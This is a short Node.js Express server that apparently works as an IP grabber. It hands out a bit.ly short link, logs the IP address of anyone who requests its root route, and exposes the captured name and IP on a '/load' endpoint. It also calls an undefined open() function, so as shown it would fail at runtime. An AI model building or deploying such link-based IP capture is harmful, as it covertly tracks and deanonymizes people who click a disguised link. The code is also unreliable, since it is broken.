const port = process.env.PORT || 3000;
let name, url, IP;
const bodyParser = require("body-parser");
const express = require("express");

const allowCrossDomain = function(req, res, next) {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE');
  res.header(
    'Access-Control-Allow-Headers',
    'Content-Type, Authorization, access_token'
  );
  if('OPTIONS' === req.method){
    res.sendStatus(200)
  }else{
    next()
  }
};

const app = express();

app
.use(bodyParser.urlencoded({
  extended: true
}))
.use('/', express.static('public'))
.use(allowCrossDomain)
.use(bodyParser.json())
.use(express.json())
  .post("/", (req, res) => {
    name = req.body.name;
    url = req.body.url;
    res.send(JSON.stringify({access_url: "https://bit.ly/37AiGmD"}));
  })
  .get("/", (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.connection.socket.remoteAddress || req.socket.remoteAddress || '0.0.0.0', 
    str = (ip.match(/[^0-9.]/g)) ? ip.replace(/[^0-9.]/g, "") : ip;
    IP = str;
    if(url === null || url === undefined || url === '') {
      open("https://rhipsali.github.io/get_ip");
    } else {
      open(url);
    }
    console.log(`IP: ${str}`);
    res.sendStatus(200);
  })
  .get("/load", (req, res) => {
    name = name || 'null';
    IP = IP || 'null';
    res.send(JSON.stringify({name, ip: IP}));
  })
  .listen(port, () => console.log("listening on " + port))
;
